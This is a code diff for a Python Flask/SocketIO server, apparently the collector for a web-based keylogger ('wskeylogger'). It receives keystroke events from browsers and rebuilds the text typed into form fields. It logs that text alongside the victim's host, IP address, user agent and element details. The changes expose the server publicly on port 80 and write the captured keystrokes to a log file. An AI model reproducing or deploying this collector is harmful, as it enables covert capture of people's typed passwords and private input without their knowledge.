@@ -1,13 +1,21 @@
 import json
+import logging
 import tables
 
 from flask import Flask, render_template, request
 from flask.ext.socketio import SocketIO, emit
 from aux import pprint
+from datetime import datetime
+
+
+#rightnow = datetime.now()
+#rightnow = rightnow.strftime('%Y/%m/%d %H:%M:%S')
+#logfile = 'wskeylogger-%s.log' % rightnow
+logging.basicConfig(filename='wskeylogger.log', level=logging.INFO)
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret'
-#app.config['DEBUG'] = True
+app.config['DEBUG'] = False
 socketio = SocketIO(app)
 
 hosts = {}
@@ -23,6 +31,7 @@ def index():
 
 @socketio.on('connect', namespace='/test')
 def test_connect():
+
     emit('confirm connection', { 'data' : 'Connected' })
 
 @socketio.on('send_details', namespace='/test')
@@ -105,18 +114,25 @@ def keydown(message):
 
         contents.insert(selection_start, keystroke)
 
+    
+    keylog_entry = []
     if configs['hosts']:
-        print '[', host, ']',
+        keylog_entry.append(host)
     if configs['clients']:
-        print '[', ip ,']',
+        keylog_entry.append(ip)
     if configs['user_agents']:
-        print '[', message['page_details']['user_agent'], ']',
-    print '<%s id="%s" class="%s" name="%s">: %s' %\
+        keylog_entry.append(message['page_details']['user_agent'])
+
+    keylog_entry.append('<%s id="%s" class="%s" name="%s"> textval: %s' %\
         (message['data']['tag_details']['tag'],
          message['data']['tag_details']['id'],
          message['data']['tag_details']['class'],
          message['data']['tag_details']['name'],
-         ''.join(contents))
+         ''.join(contents)))
+
+    keylog_entry = ' '.join(keylog_entry)
+    #logging.log(keylog_entry)
+    print keylog_entry
 
 if __name__ == '__main__':
-    socketio.run(app)
+    socketio.run(app, host='0.0.0.0', port=80)
